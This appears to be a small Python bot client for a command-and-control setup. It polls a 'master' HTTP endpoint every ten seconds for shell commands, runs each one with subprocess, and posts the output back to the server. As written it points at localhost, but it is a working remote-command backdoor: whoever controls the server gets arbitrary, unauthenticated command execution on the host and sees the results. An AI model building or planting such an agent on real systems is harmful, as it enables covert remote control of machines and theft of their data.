import requests as r
import os
import subprocess
import json
import time

master="user"
slave="sot-pc"

while True:
	print('\nChecking if there is any command for me.')
	payload = {'slave_name': slave, 'master_name': master}
	response = r.get('http://localhost:3000/slave_api', params=payload)
	command = json.loads(response.content)[0].split(' ')
	temp = []
	for com in command:
		if com != '':
			temp.append(com)
	command = temp
	if command[0] == 'Nope':
		print('No command for me yet.')
		time.sleep(10)
		continue

	timestamp = json.loads(response.content)[1]

	try:
		out = subprocess.check_output(command)
	except Exception as e:
		out = e

	payload_out = {'slave_name': slave, 'master_name':master , 'timestamp' : timestamp, 'out' : out}
	r.post('http://localhost:3000/slave_api', params=payload_out)
	
	print('i ran command: ' + str(command))
	time.sleep(10)